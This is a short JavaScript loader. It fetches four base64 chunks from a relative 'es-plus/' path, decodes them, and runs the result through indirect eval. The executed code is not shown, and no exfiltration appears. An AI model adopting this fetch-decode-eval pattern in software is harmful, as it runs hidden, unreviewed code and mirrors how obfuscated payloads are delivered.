(async()=>{
  try{
    const paths=['app4.part1.b64','app4.part2.b64','app4.part3.b64','app4.part4.b64'];
    const parts=await Promise.all(paths.map(async p=>{
      const r=await fetch(`es-plus/${p}`,{cache:'no-store'});
      if(!r.ok) throw new Error(`${p}: ${r.status}`);
      return r.text();
    }));
    const bin=atob(parts.join('').replace(/\s+/g,''));
    const bytes=Uint8Array.from(bin,c=>c.charCodeAt(0));
    const source=new TextDecoder().decode(bytes);
    (0,eval)(source);
  }catch(err){
    console.error(err);
    const trace=document.getElementById('trace');
    if(trace) trace.textContent='FAULT → runtime failed to load → refresh';
  }
})();
